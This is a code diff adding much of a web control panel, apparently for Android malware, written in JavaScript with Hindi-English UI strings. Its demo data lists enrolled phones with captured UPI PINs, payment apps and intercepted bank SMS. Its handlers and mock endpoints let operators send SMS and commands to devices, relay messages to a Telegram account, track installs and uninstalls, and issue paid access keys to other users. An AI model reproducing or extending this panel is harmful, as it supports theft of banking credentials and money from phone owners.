+await api("/admin/rules",{method:"POST",body:JSON.stringify({name:name,match:match,reply:reply,upi_only:$("#ruleUpi").checked})});
+$("#ruleName").value=""; $("#ruleMatch").value=""; $("#ruleReply").value="";
+$("#ruleUpi").checked=false; toast("rule added"); await loadRules();
+}catch(e){ toast(e.message); }
+});
+
+$("#relayStart").addEventListener("click",async()=>{
+const api_id=$("#relayApiId").value.trim();
+const api_hash=$("#relayApiHash").value.trim();
+const phone=$("#relayPhone").value.trim();
+if(!phone){ toast("phone daalo"); return; }
+$("#relayStart").disabled=true;
+try{
+await api("/admin/relay/login/start",{method:"POST",body:JSON.stringify({api_id:api_id,api_hash:api_hash,phone:phone})});
+toast("code bheja — Telegram check karo"); await loadRelay();
+}catch(e){ toast(e.message); } finally{ $("#relayStart").disabled=false; }
+});
+$("#relayVerify").addEventListener("click",async()=>{
+$("#relayVerify").disabled=true;
+try{
+const r=await api("/admin/relay/login/verify",{method:"POST",
+body:JSON.stringify({code:$("#relayCode").value.trim(),password:$("#relayPass").value})});
+if(r.status==="2fa_required"){ toast("2FA password daalo"); return; }
+$("#relayCode").value=""; $("#relayPass").value="";
+toast("relay connected"); await loadRelay(); await loadAutoSender();
+}catch(e){ toast(e.message); } finally{ $("#relayVerify").disabled=false; }
+});
+$("#relayLogout").addEventListener("click",async()=>{
+try{ await api("/admin/relay/logout",{method:"POST"}); toast("logged out"); await loadRelay(); }
+catch(e){ toast(e.message); } });
+$("#relayTest").addEventListener("click",async()=>{
+try{ await api("/admin/auto-sender/test",{method:"POST"}); toast("test message bheja"); }
+catch(e){ toast(e.message); } });
+$("#fwdSave").addEventListener("click",async()=>{
+const t=$("#fwdInput").value.trim();
+try{ const r=await api("/admin/relay/forward",{method:"POST",body:JSON.stringify({target:t})});
+state.forward=r.forward_user||t; toast("forward target saved"); await loadRelay(); }
+catch(e){ toast(e.message); } });
+$("#banAdd").addEventListener("click",async()=>{
+const a=$("#banInput").value.trim(); if(!a)return;
+try{ await api("/admin/relay/bans",{method:"POST",body:JSON.stringify({address:a})});
+$("#banInput").value=""; await loadRelay(); }catch(e){ toast(e.message); } });
+$("#parseBtn").addEventListener("click",async()=>{
+const text=$("#parseText").value.trim(); if(!text)return;
+try{ const r=await api("/admin/relay/parse",{method:"POST",body:JSON.stringify({text:text})});
+$("#parseOut").textContent=JSON.stringify(r,null,2); }
+catch(e){ $("#parseOut").textContent=e.message; } });
+
+$("#msgFilter").addEventListener("change",renderMessages);
+$("#msgSearch").addEventListener("input",renderMessages);
+
+/* -------- key generate -------- */
+$("#kGen").addEventListener("click",async()=>{
+const btn=$("#kGen"); btn.disabled=true;
+try{
+const r=await api("/admin/keys",{method:"POST",body:JSON.stringify({
+label:$("#kLabel").value.trim(),
+phone:$("#kPhone").value.trim(),
+days:Number($("#kDays").value)
+})});
+$("#kValue").textContent=r.key;
+$("#kOut").hidden=false;
+$("#kLabel").value=""; $("#kPhone").value="";
+toast("key ban gayi — copy karke user ko bhejo");
+await loadUsers();
+}catch(e){ toast(e.message); } finally{ btn.disabled=false; }
+});
+$("#kCopy").addEventListener("click",()=>copyText($("#kValue").textContent.trim()));
+
+$("#loginForm").addEventListener("submit",async(ev)=>{
+ev.preventDefault();
+const btn=$("#loginBtn"); btn.disabled=true; btn.textContent="Signing in…";
+loginMsg("");
+const id=$("#username").value.trim();
+const pass=$("#password").value;
+const keep=$("#remember").checked;
+try{
+let r;
+if(pass){
+r=await api("/panel/login",{method:"POST",body:JSON.stringify({username:id,password:pass})},false);
+saveSession(id,pass,keep,r.role);
+}else{
+r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:id})},false);
+saveSession(r.username||id,null,keep,r.role);
+}
+if(r&&r.token)setToken(r.token);
+$("#password").value="";
+loginMsg("Signed in", "ok");
+showApp();
+await afterLogin(r.role);
+toast("welcome, "+(r.role==="admin"?"admin":"user"));
+}catch(err){
+loginMsg(err.message||"Access denied");
+}finally{ btn.disabled=false; btn.textContent="Sign in"; }
+});
+
+$("#logoutBtn").addEventListener("click",async()=>{
+try{ await api("/admin/logout",{method:"POST"},false); }catch(e){}
+try{ if(state.ws)state.ws.close(); }catch(e){}
+clearTimeout(state.pollTimer); clearTimeout(state.wsTimer);
+clearSession();
+state.devices=[]; state.messages=[]; state.devMsgs={}; state.users=[];
+state.growth=null; state.growthEvents=[];
+state.pinsOnly=false; state.role="user";
+state.sel={as:[],send:[],bulk:[]};
+gridSig=""; liveSig="";
+$("#pinsBtn").classList.remove("on");
+showLogin(""); toast("logged out");
+});
+
+document.querySelectorAll(".nav").forEach((b)=>b.addEventListener("click",()=>navigate(b.dataset.page)));
+document.querySelectorAll("[data-goto]").forEach((b)=>b.addEventListener("click",()=>navigate(b.dataset.goto)));
+document.querySelectorAll("[data-refresh]").forEach((b)=>b.addEventListener("click",()=>refreshSection(b.dataset.refresh)));
+$("#refreshBtn").addEventListener("click",refreshAll);
+
+document.addEventListener("click",(ev)=>{ if(!ev.target.closest(".act-wrap"))$("#actMenu").hidden=true; });
+document.addEventListener("keydown",(ev)=>{ if(ev.key==="Escape"&&!$("#detail").hidden)closeDetail(); });
+document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&state.auth){
+loadDevices().catch(()=>{}); loadMessages().catch(()=>{}); loadStats().catch(()=>{}); } });
+
+/* ------------------------------- demo ------------------------------- */
+
+const DEMO_DEVICES=[
+{id:"d1",short_id:"TPC-0001",device_name:"Redmi Note 12",ws_connected:true,live_number:"+91 98765 11223",entered_number:"+91 98765 11223",upi_pin:"4821",payment_app:"PhonePe",install_state:"active",install_seq:1,app_version:"4.4",created_at:Date.now()-777600000,auto_sender:{enabled:true,channel_id:"-1002345678901",channel_title:"TPC Relay",sim_slots:[0,1],tg_confirm:true},telemetry:{model:"Redmi Note 12",manufacturer:"Xiaomi",android_version:"13",battery_level:84,ram_gb:6,storage_gb:128,network_type:"4G",sims:[{slot:0,carrier:"Jio"},{slot:1,carrier:"Airtel"}]}},
+{id:"d2",short_id:"TPC-0002",device_name:"Realme C55",ws_connected:true,live_number:"+91 98765 44556",entered_number:"+91 98765 44556",upi_pin:"9107",payment_app:"Paytm",install_state:"active",install_seq:2,app_version:"4.4",created_at:Date.now()-518400000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Realme C55",manufacturer:"Realme",android_version:"14",battery_level:23,ram_gb:4,storage_gb:64,network_type:"4G",sims:[{slot:0,carrier:"Airtel"}]}},
+{id:"d3",short_id:"TPC-0003",device_name:"Poco M6",ws_connected:false,live_number:null,entered_number:"+91 90123 77889",upi_pin:"3355",payment_app:"GPay",install_state:"uninstalled",install_seq:1,app_version:"4.3",created_at:Date.now()-345600000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Poco M6",manufacturer:"Poco",android_version:"13",battery_level:12,ram_gb:4,storage_gb:128,network_type:"WiFi",sims:[{slot:0,carrier:"Vi"}]}},
+{id:"d4",short_id:"TPC-0004",device_name:"Samsung A15",ws_connected:true,live_number:"+91 99887 33445",entered_number:"+91 99887 33445",upi_pin:null,payment_app:"PhonePe",install_state:"active",install_seq:1,app_version:"4.4",created_at:Date.now()-172800000,auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true},telemetry:{model:"Galaxy A15",manufacturer:"Samsung",android_version:"14",battery_level:67,ram_gb:6,storage_gb:128,network_type:"5G",sims:[{slot:0,carrier:"Jio"}]}}
+];
+
+const DEMO_MESSAGES=[
+{id:"m0",device_id:"d1",device_name:"Redmi Note 12",direction:"in",address:"VK-SBIINB",body:"Rs.450.00 credited to A/c XX1234 via UPI. Ref 402312459871",amount:"450",kind:"upi",status:"received",sim_slot:null,created_at:Date.now()-600000},
+{id:"m1",device_id:"d2",device_name:"Realme C55",direction:"in",address:"AX-PAYTM",body:"Rs.1,200 debited from A/c XX9912. UPI ref 402398112233",amount:"1200",kind:"upi",status:"received",sim_slot:null,created_at:Date.now()-1900000},
+{id:"m2",device_id:"d4",device_name:"Samsung A15",direction:"out",address:"+91 98765 11223",body:"Payment received, thanks!",amount:null,kind:null,status:"sent",sim_slot:0,created_at:Date.now()-2900000},
+{id:"m3",device_id:"d1",device_name:"Redmi Note 12",direction:"out",address:"+91 98765 11223",body:"Auto reply from SIM 2",amount:null,kind:null,status:"sent",sim_slot:1,created_at:Date.now()-500000}
+];
+
+const DEMO_KEYS=[
+{id:"k1",key:"TPC-8H4K-2MNP-9QRS",label:"Rahul",phone:"+91 90000 11111",created_at:Date.now()-86400000*12,last_login_at:Date.now()-3600000,login_count:14,expires_at:new Date(Date.now()+86400000*18).toISOString(),blocked:false,expired:false},
+{id:"k2",key:"TPC-7T3D-KLMN-4WXY",label:"Vikas",phone:"+91 90000 22222",created_at:Date.now()-86400000*40,last_login_at:Date.now()-86400000*3,login_count:52,expires_at:new Date(Date.now()-86400000*2).toISOString(),blocked:false,expired:true},
+{id:"k3",key:"TPC-2A9B-PQRS-6DEF",label:"Amit",phone:"",created_at:Date.now()-86400000*3,last_login_at:null,login_count:0,expires_at:new Date(Date.now()+86400000*4).toISOString(),blocked:false,expired:false}
+];
+
+function mockApi(path,options){
+const p=path.split("?")[0]; const o=options||{};
+let body={}; try{ body=o.body?JSON.parse(o.body):{}; }catch(e){ body={}; }
+if(p==="/admin/auth/status")return{authenticated:Boolean(readSession()),role:(readSession()||{}).role||"admin"};
+if(p==="/panel/login")return{status:"ok",username:body.username||"admin",role:"admin",token:"demo."+btoa(body.username||"a"),expires_in:2592000};
+if(p==="/panel/access")return{status:"ok",username:"keyuser",role:"user",token:"demo."+btoa(body.key||"k"),expires_in:2592000};
+if(p==="/admin/logout")return{status:"ok"};
+if(p==="/health")return{status:"ok"};
+if(p==="/health/database")return{status:"ok"};
+if(p==="/admin/devices")return{devices:DEMO_DEVICES};
+if(p==="/admin/messages")return{messages:DEMO_MESSAGES};
+if(p==="/admin/stats")return{
+installs_total:DEMO_DEVICES.length,unique_devices:4,reinstalls:1,
+install_events_24h:2,install_events_7d:3,updates_total:1,updates_7d:1,
+live:3,idle:0,stale:0,uninstalled:1,replaced:0,onboarded:3,
+retention_pct:75.0,uninstall_rate_pct:25.0,
+outbox:{queued:2,sent:11,delivered:9,failed:1,pending:2},
+generated_at:new Date().toISOString()};
+if(p==="/admin/growth/events")return{events:[
+{id:"e1",event:"install",short_id:"TPC-0004",device_name:"Samsung A15",app_version:"4.4",android_id:"a1b2c3d4e5f6",ts:new Date(Date.now()-3600000).toISOString()},
+{id:"e2",event:"install",short_id:"TPC-0002",device_name:"Realme C55",app_version:"4.4",android_id:"b2c3d4e5f6a1",ts:new Date(Date.now()-7200000).toISOString()},
+{id:"e3",event:"update",short_id:"TPC-0001",device_name:"Redmi Note 12",app_version:"4.4",android_id:"c3d4e5f6a1b2",ts:new Date(Date.now()-10800000).toISOString()},
+{id:"e4",event:"gone",short_id:"TPC-0003",device_name:"Poco M6",app_version:"4.3",android_id:"d4e5f6a1b2c3",ts:new Date(Date.now()-14400000).toISOString()}
+]};
+if(p==="/admin/keys"){
+if(o.method==="POST"){
+const k="TPC-"+Math.random().toString(36).slice(2,6).toUpperCase()+"-"+
+Math.random().toString(36).slice(2,6).toUpperCase()+"-"+
+Math.random().toString(36).slice(2,6).toUpperCase();
+DEMO_KEYS.unshift({id:"k"+Date.now(),key:k,label:body.label||"",phone:body.phone||"",
+created_at:Date.now(),last_login_at:null,login_count:0,
+expires_at:Number(body.days)>0?new Date(Date.now()+Number(body.days)*86400000).toISOString():null,
+blocked:false,expired:false});
+return{status:"ok",key:k};
+}
+return{keys:DEMO_KEYS};
+}
+if(/^\/admin\/keys\/[^/]+\/expiry$/.test(p)){
+const id=p.split("/")[3]; const u=DEMO_KEYS.find((x)=>x.id===id);
+if(u){
+if(body.lifetime){ u.expires_at=null; u.expired=false; }
+else if(body.days!=null){ u.expires_at=new Date(Date.now()+body.days*86400000).toISOString(); u.expired=false; }
+else if(body.expires_at){ u.expires_at=new Date(body.expires_at).toISOString(); u.expired=false; }
+}
+return{status:"ok"};
+}
+if(/^\/admin\/keys\/[^/]+\/toggle$/.test(p)){
+const id=p.split("/")[3]; const u=DEMO_KEYS.find((x)=>x.id===id);
+if(u)u.blocked=Boolean(body.blocked); return{status:"ok"};
+}
+if(/^\/admin\/keys\/[^/]+\/delete$/.test(p)){
+const id=p.split("/")[3]; const i=DEMO_KEYS.findIndex((x)=>x.id===id);
+if(i>=0)DEMO_KEYS.splice(i,1); return{status:"ok"};
+}
+if(p==="/admin/rules"){
+if(o.method==="POST"){ state.rules.push({id:"r"+Date.now(),name:body.name,match:body.match,
+reply:body.reply,upi_only:Boolean(body.upi_only),enabled:true}); return{status:"ok"}; }
+return{rules:state.rules};
+}
+if(/^\/admin\/rules\/[^/]+\/toggle$/.test(p)){
+const id=p.split("/")[3]; const r=state.rules.find((x)=>x.id===id);
+if(r)r.enabled=!r.enabled; return{status:"ok",enabled:r?r.enabled:false};
+}
+if(p==="/admin/auto-sender")return{relay_ready:true,telethon:true,account:{username:"tpc_ops"},
+forward_user:"@tpc_ops",channels:["-1002345678901"],devices_enabled:1};
+if(p==="/admin/auto-sender/verify")return{status:"ok",channel_id:body.channel_id,title:"TPC Relay",admin:true};
+if(p==="/admin/auto-sender/test")return{status:"ok"};
+if(/^\/admin\/devices\/[^/]+\/auto-sender$/.test(p)){
+const id=p.split("/")[3]; const d=DEMO_DEVICES.find((x)=>x.id===id);
+if(!d)return{status:"ok",auto_sender:{enabled:false,channel_id:"",channel_title:"",sim_slots:[],tg_confirm:true}};
+d.auto_sender={
+enabled:body.enabled===undefined?d.auto_sender.enabled:Boolean(body.enabled),
+channel_id:body.channel_id===undefined?d.auto_sender.channel_id:body.channel_id,
+channel_title:body.channel_title||d.auto_sender.channel_title||"",
+sim_slots:body.sim_slots===undefined?d.auto_sender.sim_slots:(body.sim_slots||[]).slice(),
+tg_confirm:body.tg_confirm===undefined?d.auto_sender.tg_confirm:Boolean(body.tg_confirm)
+};
+return{status:"ok",auto_sender:d.auto_sender};
+}
+if(/^\/admin\/devices\/[^/]+\/messages$/.test(p)){
+const id=p.split("/")[3]; return{messages:DEMO_MESSAGES.filter((x)=>x.device_id===id)};
+}
+if(/^\/admin\/devices\/[^/]+\/push-outbox$/.test(p))return{status:"ok",pushed:1};
+if(/^\/admin\/devices\/[^/]+\/(sms|command|ping|refresh|wake)$/.test(p))return{status:"ok",queued:1,delivered:true,slots:body.sim_slots||[null]};
+if(p==="/admin/send")return{status:"ok",queued:DEMO_DEVICES.length,delivered:DEMO_DEVICES.filter((d)=>d.ws_connected).length,note:""};
+if(p==="/admin/relay/status")return{telethon:true,state:{authorized:true,me:{username:"tpc_ops"},forward_user:"@tpc_ops"},bans:state.bans||[],channels:["-1002345678901"]};
+if(p==="/admin/relay/logs")return{logs:state.tgLogs};
+if(p==="/admin/relay/login/start")return{status:"code_sent"};
+if(p==="/admin/relay/login/verify")return{status:"ok"};
+if(p==="/admin/relay/logout")return{status:"ok"};
+if(p==="/admin/relay/forward")return{status:"ok",forward_user:body.target};
+if(p==="/admin/relay/bans"){
+state.bans=state.bans||[];
+if(o.method==="POST"){ state.bans.push(body.address); return{status:"ok",bans:state.bans}; }
+return{bans:state.bans};
+}
+if(/^\/admin\/relay\/bans\/.+\/delete$/.test(p))return{status:"ok",bans:state.bans||[]};
+if(p==="/admin/relay/parse")return{matched:true,to:"+919876543210",body:"Rs.450 credited via UPI",device_hint:null,targets:["TPC-0001"]};
+return{};
+}
+
+buildSimChips($("#bulkSims"),"bulk",null);
+checkAuth();
+</script>
+</div>
+</body>
+</html>
